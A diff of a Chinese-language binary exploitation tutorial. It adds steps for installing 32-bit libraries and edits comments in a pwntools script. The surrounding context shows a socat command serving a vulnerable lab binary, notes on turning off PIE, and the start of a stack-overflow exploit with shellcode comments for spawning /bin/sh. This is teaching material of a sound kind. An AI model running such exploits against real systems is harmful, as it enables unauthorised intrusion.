@@ -10,7 +10,7 @@
     - [2.2. 设置coredump](#22-设置coredump)
     - [2.3. 解除安全措施的方法](#23-解除安全措施的方法)
     - [2.4. SOCAT](#24-socat)
-    - [2.5. 其它](#25-其它)
+    - [2.5. 32位库](#25-32位库)
 - [3. X86](#3-x86)
 - [4. 开启DEP](#4-开启dep)
     - [4.1. ret2libc](#41-ret2libc)
@@ -81,8 +81,17 @@ gdb xxx /tmp/core.xxx
 * GCC编译选项：`-no-pie`，用于关闭PIE（程序基址版本的ASLR）
 ## 2.4. SOCAT
 `socat TCP4-LISTEN:10001,fork EXEC:./level1`，SOCAT可以将目标程序作为一个服务绑定到服务器的某个端口上
-## 2.5. 其它
-* GCC编译选项：`-m32`，编译成32位程序
+## 2.5. 32位库
+如果要在64位环境下调试32位程序，需要安装32位相关的库函数：
+```bash
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386
+# 如果是比较老的版本，可以用下面的命令
+sudo apt-get install ia32-libs
+# gcc编译32位程序
+gcc -m32 1.c
+```
 # 3. X86
 ```python
 # encoding:utf-8
@@ -90,7 +99,7 @@ from pwn import *
 p = process('./level1') 
 # 返回地址，通过调试确定栈中地址
 ret = 0xbffff290
-# 通过自编译生成shellcode，也可以通过msf生成
+# 通过自编译生成shellcode，也可以通过msf生成，21字节的shellcode
 # shellcode最后的功能相当于execve ("/bin/sh") 
 # xor ecx, ecx      ;清零ecx
 # mul ecx           ;ecx*eax，清零eax和edx
